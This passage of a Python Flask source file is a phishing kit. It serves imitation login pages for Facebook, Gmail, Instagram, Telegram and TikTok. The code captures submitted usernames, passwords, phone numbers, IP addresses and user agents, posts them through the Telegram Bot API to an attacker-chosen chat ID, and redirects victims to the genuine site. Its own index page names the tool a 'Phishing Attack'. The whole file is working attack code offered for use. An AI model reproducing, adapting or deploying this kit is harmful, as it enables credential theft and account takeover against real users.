                        <span class="separator">|</span>
                        <input type="tel" class="phone-input" name="username" id="phone_number" 
                               placeholder="Phone number" required pattern="[0-9]{7,15}">
                        <input type="hidden" name="password" id="countryCode" value="+855">
                    </div>
                </div>

                <div class="checkbox-group">
                    <div class="checkbox checked" id="keepSignedInCheckbox"></div>
                    <label class="checkbox-label" for="keepSignedInCheckbox">Keep me signed in</label>
                    <input type="hidden" name="keep_signedin" id="keepSignedIn" value="on">
                </div>

                <button type="submit" class="login-btn">NEXT</button>
            </div>
        </form>

        <div class="qr-section">
            <div class="qr-title">LOG IN BY QR CODE</div>
            <div class="qr-subtitle">
                Open Telegram on your phone and go to<br>
                Settings > Devices > Scan QR Code
            </div>
        </div>

        <div class="footer">
            <div class="footer-text">
                By signing in, you agree to our <a href="#" class="footer-link">Terms of Service</a> 
                and <a href="#" class="footer-link">Privacy Policy</a>.
            </div>
        </div>
    </div>

    <script>
        // Country codes for all countries
        const countryCodes = {
            'Afghanistan': '+93',
            'Albania': '+355',
            'Algeria': '+213',
            'Andorra': '+376',
            'Angola': '+244',
            'Antigua and Barbuda': '+1',
            'Argentina': '+54',
            'Armenia': '+374',
            'Australia': '+61',
            'Austria': '+43',
            'Azerbaijan': '+994',
            'Bahamas': '+1',
            'Bahrain': '+973',
            'Bangladesh': '+880',
            'Barbados': '+1',
            'Belarus': '+375',
            'Belgium': '+32',
            'Belize': '+501',
            'Benin': '+229',
            'Bhutan': '+975',
            'Bolivia': '+591',
            'Bosnia and Herzegovina': '+387',
            'Botswana': '+267',
            'Brazil': '+55',
            'Brunei': '+673',
            'Bulgaria': '+359',
            'Burkina Faso': '+226',
            'Burundi': '+257',
            'Cambodia': '+855',
            'Cameroon': '+237',
            'Canada': '+1',
            'Cape Verde': '+238',
            'Central African Republic': '+236',
            'Chad': '+235',
            'Chile': '+56',
            'China': '+86',
            'Colombia': '+57',
            'Comoros': '+269',
            'Congo': '+242',
            'Costa Rica': '+506',
            'Croatia': '+385',
            'Cuba': '+53',
            'Cyprus': '+357',
            'Czech Republic': '+420',
            'Denmark': '+45',
            'Djibouti': '+253',
            'Dominica': '+1',
            'Dominican Republic': '+1',
            'East Timor': '+670',
            'Ecuador': '+593',
            'Egypt': '+20',
            'El Salvador': '+503',
            'Equatorial Guinea': '+240',
            'Eritrea': '+291',
            'Estonia': '+372',
            'Ethiopia': '+251',
            'Fiji': '+679',
            'Finland': '+358',
            'France': '+33',
            'Gabon': '+241',
            'Gambia': '+220',
            'Georgia': '+995',
            'Germany': '+49',
            'Ghana': '+233',
            'Greece': '+30',
            'Grenada': '+1',
            'Guatemala': '+502',
            'Guinea': '+224',
            'Guinea-Bissau': '+245',
            'Guyana': '+592',
            'Haiti': '+509',
            'Honduras': '+504',
            'Hungary': '+36',
            'Iceland': '+354',
            'India': '+91',
            'Indonesia': '+62',
            'Iran': '+98',
            'Iraq': '+964',
            'Ireland': '+353',
            'Israel': '+972',
            'Italy': '+39',
            'Jamaica': '+1',
            'Japan': '+81',
            'Jordan': '+962',
            'Kazakhstan': '+7',
            'Kenya': '+254',
            'Kiribati': '+686',
            'North Korea': '+850',
            'South Korea': '+82',
            'Kuwait': '+965',
            'Kyrgyzstan': '+996',
            'Laos': '+856',
            'Latvia': '+371',
            'Lebanon': '+961',
            'Lesotho': '+266',
            'Liberia': '+231',
            'Libya': '+218',
            'Liechtenstein': '+423',
            'Lithuania': '+370',
            'Luxembourg': '+352',
            'Madagascar': '+261',
            'Malawi': '+265',
            'Malaysia': '+60',
            'Maldives': '+960',
            'Mali': '+223',
            'Malta': '+356',
            'Marshall Islands': '+692',
            'Mauritania': '+222',
            'Mauritius': '+230',
            'Mexico': '+52',
            'Micronesia': '+691',
            'Moldova': '+373',
            'Monaco': '+377',
            'Mongolia': '+976',
            'Montenegro': '+382',
            'Morocco': '+212',
            'Mozambique': '+258',
            'Myanmar': '+95',
            'Namibia': '+264',
            'Nauru': '+674',
            'Nepal': '+977',
            'Netherlands': '+31',
            'New Zealand': '+64',
            'Nicaragua': '+505',
            'Niger': '+227',
            'Nigeria': '+234',
            'Norway': '+47',
            'Oman': '+968',
            'Pakistan': '+92',
            'Palau': '+680',
            'Panama': '+507',
            'Papua New Guinea': '+675',
            'Paraguay': '+595',
            'Peru': '+51',
            'Philippines': '+63',
            'Poland': '+48',
            'Portugal': '+351',
            'Qatar': '+974',
            'Romania': '+40',
            'Russia': '+7',
            'Rwanda': '+250',
            'Saint Kitts and Nevis': '+1',
            'Saint Lucia': '+1',
            'Saint Vincent and the Grenadines': '+1',
            'Samoa': '+685',
            'San Marino': '+378',
            'Sao Tome and Principe': '+239',
            'Saudi Arabia': '+966',
            'Senegal': '+221',
            'Serbia': '+381',
            'Seychelles': '+248',
            'Sierra Leone': '+232',
            'Singapore': '+65',
            'Slovakia': '+421',
            'Slovenia': '+386',
            'Solomon Islands': '+677',
            'Somalia': '+252',
            'South Africa': '+27',
            'South Sudan': '+211',
            'Spain': '+34',
            'Sri Lanka': '+94',
            'Sudan': '+249',
            'Suriname': '+597',
            'Swaziland': '+268',
            'Sweden': '+46',
            'Switzerland': '+41',
            'Syria': '+963',
            'Taiwan': '+886',
            'Tajikistan': '+992',
            'Tanzania': '+255',
            'Thailand': '+66',
            'Togo': '+228',
            'Tonga': '+676',
            'Trinidad and Tobago': '+1',
            'Tunisia': '+216',
            'Turkey': '+90',
            'Turkmenistan': '+993',
            'Tuvalu': '+688',
            'Uganda': '+256',
            'Ukraine': '+380',
            'United Arab Emirates': '+971',
            'United Kingdom': '+44',
            'United States': '+1',
            'Uruguay': '+598',
            'Uzbekistan': '+998',
            'Vanuatu': '+678',
            'Vatican City': '+379',
            'Venezuela': '+58',
            'Vietnam': '+84',
            'Yemen': '+967',
            'Zambia': '+260',
            'Zimbabwe': '+263'
        };

        // Handle checkbox toggle
        document.getElementById('keepSignedInCheckbox').addEventListener('click', function() {
            this.classList.toggle('checked');
            document.getElementById('keepSignedIn').value = this.classList.contains('checked') ? 'on' : 'off';
        });

        // Update country code based on country selection
        document.getElementById('country').addEventListener('change', function() {
            const selectedCountry = this.value;
            const countryCode = countryCodes[selectedCountry] || '+855';
            document.getElementById('countryCodeDisplay').textContent = countryCode;
            document.getElementById('countryCode').value = countryCode;
        });

        // Format phone number input
        document.getElementById('phone_number').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Set Cambodia as default country
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('country').value = 'Cambodia';
        });
    </script>
</body>
</html>'''

# ==================== TIKTOK HTML ====================
TIKTOK_HTML = '''<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            color: #ffffff;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px auto;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #ff0050, #00f2ea);
        }
        .logo i {
            font-size: 40px;
            color: white;
        }
        .tiktok-text {
            font-size: 32px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 30px;
        }
        .card {
            background: #121212;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border-radius: 8px;
            border: 1px solid #333333;
            font-size: 16px;
            background: #000000;
            color: #ffffff;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #888888;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #ff0050;
            outline: none;
        }
        .login-btn {
            background-color: #ff0050;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 14px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #e00045;
        }
        .login-btn:active {
            transform: scale(0.98);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #888888;
            font-size: 14px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333333;
        }
        .divider::before {
            margin-right: 16px;
        }
        .divider::after {
            margin-left: 16px;
        }
        .other-options {
            text-align: center;
            margin-bottom: 20px;
        }
        .option-link {
            color: #ff0050;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
        }
        .signup-section {
            background: #121212;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
        }
        .signup-text {
            color: #ffffff;
            font-size: 14px;
        }
        .signup-link {
            color: #ff0050;
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
            color: #888888;
            font-size: 12px;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #888888;
            text-decoration: none;
            margin: 0 8px;
        }
        .language-selector {
            margin-top: 10px;
        }
        .language-selector select {
            background: #000000;
            color: #ffffff;
            border: 1px solid #333333;
            border-radius: 4px;
            padding: 4px 8px;
        }
        .social-login {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        .social-btn {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #333333;
            color: white;
            text-decoration: none;
            font-size: 18px;
            transition: transform 0.3s;
        }
        .social-btn:hover {
            transform: scale(1.1);
        }
        .facebook { background: #1877f2; }
        .google { background: #db4437; }
        .twitter { background: #1da1f2; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fab fa-tiktok"></i>
            </div>
            <div class="tiktok-text">TikTok</div>
        </div>

        <div class="card">
            <form action="/tiktok/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Email or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="divider">OR</div>

            <div class="social-login">
                <a href="#" class="social-btn facebook"><i class="fab fa-facebook-f"></i></a>
                <a href="#" class="social-btn google"><i class="fab fa-google"></i></a>
                <a href="#" class="social-btn twitter"><i class="fab fa-twitter"></i></a>
            </div>

            <div class="other-options">
                <a href="#" class="option-link">Use phone / email / username</a>
                <a href="#" class="option-link">Log in with QR code</a>
                <a href="#" class="option-link">Forgot password?</a>
            </div>
        </div>

        <div class="signup-section">
            <span class="signup-text">Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">About</a>
            <a href="#">Newsroom</a>
            <a href="#">Contact</a>
            <a href="#">Careers</a>
            <a href="#">ByteDance</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English</option>
                <option>ខ្មែរ</option>
                <option>中文</option>
            </select>
        </div>
        <div>© 2025 TikTok</div>
    </div>
</body>
</html>'''

def send_to_telegram(platform, username, password, ip_address, user_agent, chat_id, extra=""):
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(f"[!] Would send: [{platform}] {username}:{password}")
        return False
    
    icons = {"Facebook": "📘", "Gmail": "📧", "Instagram": "📸", "Telegram": "✈️", "TikTok": "🎵"}
    icon = icons.get(platform, "🔴")
    now = datetime.datetime.now()
    message = f"""{icon} {platform} Login Information {icon}
👤 Username: {username}
🔑 Password: {password}
{extra}
🌐 IP: {ip_address}
📱 UA: {user_agent[:80]}
⏰ Time: {now.strftime('%H:%M:%S')}
📅 Date: {now.strftime('%Y-%m-%d')}
@mengheang25"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        r = requests.post(url, data={"chat_id": chat_id, "text": message}, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def get_client_ip(request):
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>api</title>
    </head>
    <body>
        <div class="box">
            Phishing Attack , add chat_id parameter, Ex : http://10.150.124.66:5000/?id=153449749 Developer : Meng Heang</h1>
        </div>
    </body>
    </html>
    '''

@app.route('/facebook/')
def facebook_page():
    chat_id = request.args.get('id')
    if not chat_id or not re.match(r'^\d+$', chat_id):
        return "Error: Need ?id=CHAT_ID", 400
    
    # បញ្ចូល chat_id ទៅក្នុង action នៃ form
    html = FACEBOOK_HTML.replace(
        '<form action="/facebook/login" method="POST">',
        f'<form action="/facebook/login?id={chat_id}" method="POST">'
    )
    return render_template_string(html)

@app.route('/facebook/login', methods=['POST'])
def facebook_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    chat_id = request.args.get('id', '')
    if username and password and chat_id:
        send_to_telegram("Facebook", username, password, get_client_ip(request), request.headers.get('User-Agent', ''), chat_id)
    return redirect("https://www.facebook.com")

@app.route('/gmail/')
def gmail_page():
    chat_id = request.args.get('id')
    if not chat_id or not re.match(r'^\d+$', chat_id):
        return "Error: Need ?id=CHAT_ID", 400
    
    html = GMAIL_HTML.replace(
        '<form id="loginForm" action="/gmail/login" method="POST">',
        f'<form id="loginForm" action="/gmail/login?id={chat_id}" method="POST">'
    )
    return render_template_string(html)

@app.route('/gmail/login', methods=['POST'])
def gmail_login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    chat_id = request.args.get('id', '')
    if email and password and chat_id:
        send_to_telegram("Gmail", email, password, get_client_ip(request), request.headers.get('User-Agent', ''), chat_id)
    return redirect("https://accounts.google.com/signin")

@app.route('/instagram/')
def instagram_page():
    chat_id = request.args.get('id')
    if not chat_id or not re.match(r'^\d+$', chat_id):
        return "Error: Need ?id=CHAT_ID", 400
    
    html = INSTAGRAM_HTML.replace(
        '<form action="/instagram/login" method="POST">',
        f'<form action="/instagram/login?id={chat_id}" method="POST">'
    )
    return render_template_string(html)

@app.route('/instagram/login', methods=['POST'])
def instagram_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    chat_id = request.args.get('id', '')
    if username and password and chat_id:
        send_to_telegram("Instagram", username, password, get_client_ip(request), request.headers.get('User-Agent', ''), chat_id)
    return redirect("https://www.instagram.com")

@app.route('/telegram/')
def telegram_page():
    chat_id = request.args.get('id')
    if not chat_id or not re.match(r'^\d+$', chat_id):
        return "Error: Need ?id=CHAT_ID", 400
    
    html = TELEGRAM_HTML.replace(
        '<form action="/telegram/login" method="POST">',
        f'<form action="/telegram/login?id={chat_id}" method="POST">'
    )
    return render_template_string(html)

@app.route('/telegram/login', methods=['POST'])
def telegram_login():
    phone = request.form.get('username', '')
    country = request.form.get('country', '')
    chat_id = request.args.get('id', '')
    extra = f"📍 Country: {country}\n📞 Phone: {phone}"
    if phone and chat_id:
        send_to_telegram("Telegram", phone, "Phone Number Only", get_client_ip(request), request.headers.get('User-Agent', ''), chat_id, extra)
    return redirect("https://web.telegram.org")

@app.route('/tiktok/')
def tiktok_page():
    chat_id = request.args.get('id')
    if not chat_id or not re.match(r'^\d+$', chat_id):
        return "Error: Need ?id=CHAT_ID", 400
    
    html = TIKTOK_HTML.replace(
        '<form action="/tiktok/login" method="POST">',
        f'<form action="/tiktok/login?id={chat_id}" method="POST">'
    )
    return render_template_string(html)

@app.route('/tiktok/login', methods=['POST'])
def tiktok_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    chat_id = request.args.get('id', '')
    if username and password and chat_id:
        send_to_telegram("TikTok", username, password, get_client_ip(request), request.headers.get('User-Agent', ''), chat_id)
    return redirect("https://www.tiktok.com")

@app.route('/health')
def health():
    return {"status": "active", "platforms": ["facebook", "gmail", "instagram", "telegram", "tiktok"], "bot": BOT_TOKEN != "YOUR_BOT_TOKEN_HERE"}
app.debug = False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

app = app
